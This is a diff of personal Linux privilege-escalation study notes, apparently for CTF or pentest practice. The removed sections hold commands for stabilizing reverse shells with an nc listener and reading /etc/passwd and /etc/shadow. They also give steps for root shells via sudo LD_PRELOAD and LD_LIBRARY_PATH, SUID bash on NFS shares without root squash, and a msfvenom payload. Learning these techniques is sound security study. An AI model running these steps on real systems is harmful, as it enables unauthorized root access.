@@ -14,65 +14,7 @@
 # Linux privesc
 ## Basic
 ### Stable shell***
-`
-<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
-
-
-
-## Shell stabilization
-### Technique 1: Python
-1. Uses Python to spawn a better featured bash shell;
-```sh
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-```
-some targets may need replace `python` with `python2` or `python3`
-2. access to term commands such as `clear`.
-```sh
-export TERM=xterm
-```
-3. Background the shell using Ctrl + Z.
-```sh
-stty raw -echo; fg
-```
-This does two things: 
-- First, it **turns off our own terminal echo** (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes).
-- then **foregrounds the shell,** thus completing the process.
-- Note that **if the shell dies,** any input in your own terminal will **not be visible** (as a result of having disabled terminal echo). To **fix this, type** `reset` and press enter.
-### Technique 2: rlwrap
-- Rlwrap is a program which, in simple terms, gives us **access to history**, **tab autocompletion** and the **arrow keys** immediately upon receiving a shell
-``` sh
-rlwrap nc -lnvp <port>
-```
-- particularly useful when dealing with Windows shells
-- On Linux target, it's possible to completely stabilise,
-- using Ctrl + Z.
-```sh
-stty raw -echo; fg
-```
-### Technique 3: [[socat\|Socat]]
-### Technique 4: [[Operative System/Linux/Commands/SSH\|SSH]]
-
-### Extra 
-<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
-
-
-
-- On my machine to get info from stty
-```sh
-stty -a
-```
-- Next, in your reverse/bind shell, type in:
-`stty rows <number>`  
-and
-`stty cols <number>`
-
-
-</div></div>
-
- 
-
-</div></div>
-`
+[[Networking/netcat#Shell stabilization\|netcat#Shell stabilization#Technique 1 Python]]
 
 ### Get a bash
 ```shell
@@ -83,61 +25,8 @@ script /dev/null -c bash
 ```shell
 sudo -u root /bin/bash
 ```
-## System enumeration - Manual***
-`### 
-<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
-
-
-
-## 
-<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
-
-
-
- 
-| Option                                              | Description                                                                                                                        |
-| --------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
-| `hostname`                                          | Show the hostname                                                                                                                  |
-| `hostname -I`<br>`ip a`                             | Show all IPs                                                                                                                       |
-| `hostname -i`                                       | Show IP                                                                                                                            |
-| `who`                                               | Muestra los usuarios conectados al sistema.                                                                                        |
-| `whoiam`                                            | Muestra la inform​acion del usuario actual.                                                                                        |
-| `uname`                                             | Muestra inform​acion del sistema.                                                                                                  |
-| `uname -a`                                          | Show kernel                                                                                                                        |
-| `uname -r`                                          | only kernel                                                                                                                        |
-| `cat /etc/issue`<br><br>`cat /etc/os-release`       | Show linux OS version                                                                                                              |
-| `env`                                               | print enviroment variables of current session                                                                                      |
-| `id`                                                | Muestra el identi​ficador y el grupo de usuario.                                                                                   |
-| `cat /etc/passwd`                                   | Información de usuarios                                                                                                            |
-| `history`                                           | Commands history                                                                                                                   |
-| `ifconfig`                                          | Show interfaces                                                                                                                    |
-| `ip route`                                          | See which network routes exist.                                                                                                    |
-| `cat /proc/version`                                 | Info about the target system processes, kernel and compiler version                                                                |
-| `ps`                                                | List running processes basic                                                                                                       |
-| `ps -A`                                             | View all running processes                                                                                                         |
-| `ps -faux`                                          | processes for all users (a)<br>display the user that launched the process (u)<br>processes that are not attached to a terminal (x) |
-| `ps axjf`                                           | View process tree                                                                                                                  |
-| `ps -eo command`                                    | List all running commands                                                                                                          |
-| `netstat -nat`<br>`ss -nltp`<br>`cat /proc/net/tcp` | Get info about ports                                                                                                               |
-| `logname`                                           | Muestra inform​acion del usuario conectado.                                                                                        |
-| `date`                                              | Informa de la fecha y hora actual.                                                                                                 |
-| `which cat`<br>`command -v cat`<br>`which whoami`   | Mostrar la ruta absoluta de un binario                                                                                             |
-| `echo $SHELL`                                       | Mostrar Tipo de shell actual                                                                                                       |
-| `cat /etc/shells`<br>`chsh -l`                      | Mostrar Tipos de shell                                                                                                             |
-| `chch -s /bin/zsh`                                  | Change shell (Require restart)                                                                                                     |
-| `echo $PATH`                                        | Mostrar el Path donde busca los archivos para ejecutar                                                                             |
-| `echo $?`                                           | Mostrar el código de estado del comando anterior<br> 0(exitoso), 1(no exitoso)                                                     |
-| `lsof -i:22`                                        | Get info about the service running in the port                                                                                     |
-| `./`                                                | Current directory                                                                                                                  |
-| `../`                                               | pass level of directory, 1 level up                                                                                                |
-| `id -u`                                             | if the answer is 0, I am root                                                                                                      |
-
-
-</div></div>
-
-
-</div></div>
-`
+## System enumeration - Manual
+### [[Operative System/Linux/Commands/- Commands linux#! Get information\|- Commands linux#! Get information]]***
 ### 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
@@ -294,7 +183,7 @@ perl linux-exploit-suggester-2.pl
 
 </div></div>
 
-## Sudo -l ***
+## Sudo -l
 ```bash
 sudo -l
 ```
@@ -311,49 +200,7 @@ sudo -l -U tracy
 - we can use a "hack" to leak information **leveraging a function of the application.**
 
 Example: Apache2 ant the `-f` parameter used to load the `/etc/shadow`, this will result in an error message that includes the first line of the `/etc/shadow` file.
-`### 
-<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
-
-
-
-- Sudo can be configured to **inherit** certain environment **variables from the user**'s environment.
-- Check which environment variables are inherited (look for the env_keep options):
-```shell
-sudo -l
-Matching Defaults entries for user on this host:
-    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
-```
-- LD_PRELOAD and LD_LIBRARY_PATH are both **inherited from the user's environment**.
-- LD_PRELOAD loads a shared object before any others when a program is run.
-- LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.
-### LD_PRELOAD
-- Create a shared object using the code located at /home/user/tools/sudo/[[preload.c\|preload.c]]:
-```shell
-gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
-```
-- Run one program (listed when running **sudo -l**), while setting the LD_PRELOAD environment variable to the full path of the new shared object:
-- A root shell should spawn.
-```shell
-sudo LD_PRELOAD=/tmp/preload.so program-name-here
-```
-### LD_LIBRARY_PATH
-Run ldd against the apache2 program file to see which shared libraries are used by the program:
-```shell
-ldd /usr/sbin/apache2
-```
-
-Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/[[library_path.c\|library_path.c]]:
-```shell
-gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
-```
-
-Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp
-```shell
-sudo LD_LIBRARY_PATH=/tmp apache2
-```
-
-</div></div>
-`
+### [[sudo Environment Variables\|sudo Environment Variables]]***
 ## SUID-SGID executables scaling
 - https://gtfobins.github.io/
 - [[Operative System/Linux/Permisos/SUID\|SUID]] [[Operative System/Linux/Permisos/SGID\|SGID]]
@@ -845,79 +692,7 @@ username:password
 </div></div>
 
 
-`## 
-<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
-
-
-
-## NFS exploitation
-- If  you found that a machine has an NFS share you might be able to use that to escalate privileges, depending on how it is configured.
-### root_squash
-- By **default**, on NFS shares- **Root Squash**ing is **enabled**, and **prevents** anyone connecting to the NFS share from having **root access** to the NFS volume.
-- Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges.
-- Not what we want. However, **if this is turned off**, it can allow the creation of [[Operative System/Linux/Permisos/SUID\|SUID]] bit files, allowing a remote user root access to the connected system.
-### Check root_squash
-On the target machine check which file systems are exporting to remote hosts.
-```shell
-cat /etc/exports
-```
-Check if any share has root squashing disabled like:
-`/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)`
-### Method 1 -  Copy Bash file
-- We're **able** to **upload files** to the NFS share, and control the permissions of these files.
-- **We can set the permissions** of whatever we upload, in this case a **bash** shell executable.
-- We can then log in through SSH and execute this executable to gain a root shell!
-1. NFS Access
-   Mount if `/tmp` has `no_root_squash`
-```shell
-mount 192.168.1.101:/ /tmp/
-mount -o rw,vers=3 VICTIM_IP:/tmp /tmp/nfs
-```
-2. Gain Low Privilege Shell
-3. Download and put the victim bash file to the NFS share
-   `scp victimname@VICTIM_IP:/bin/bash /tmp/nfs`
-4. Set SUID Permissions Through NFS Due To Misconfigured Root Squash
-   ```shell
-   sudo chown root bashfile
-   sudo chmod +s bashfile
-   ```
-5. Login through SSH
-6. Execute SUID Bit Bash Executable (On the victim machine)
-   ```shell
-   ./bash -p
-   ```
-   The `-p` persists the permissions, so that it can run as root with SUID as otherwise bash will sometimes drop the permissions.
-7. ROOT ACCESS
-### Method 2 - Create Executable file
-```shell
-# First check if the target machine has any NFS shares
-showmount -e 192.168.1.101
-```
-If it does, then mount it to your filesystem
-Log as **root** and mount.
-Mount if `/tmp` has `no_root_squash`
-```shell
-mount 192.168.1.101:/ /tmp/
-mount -o rw,vers=3 VICTIM_IP:/tmp /tmp/nfs
-```
-If that succeeds, go to `/tmp/share` or `/tmp/nfs`
-There might be some interesting stuff there.
-But even if there isn't you might be able to exploit it.
-- **Test** if you can **create files**, then check with your low-priv shell **what user** has **created** that file.
-- **If it root**, **create** a [[exploit_file_NFS\|exploit_file_NFS]] **or** generate a payload using **msfvenom**
-```shell
-msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
-```
-- save it to the mounted share or compile it with [[Programming/gcc\|gcc]] (On the victim machine if it's possible to avoid compatibility issues) to get the executable
-- set it with **[[Operative System/Linux/Permisos/SUID\|suid]]**-permission from your attacking machine.
-```shell
-chmod 4777 exploit_file
-chmod +xs exploit_file
-```
- - And then **execute it** with your low privilege shell on the victim machine.
-
-</div></div>
-`
+## [[NFS#NFS exploitation\|NFS#NFS exploitation]]***
 
 ## 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
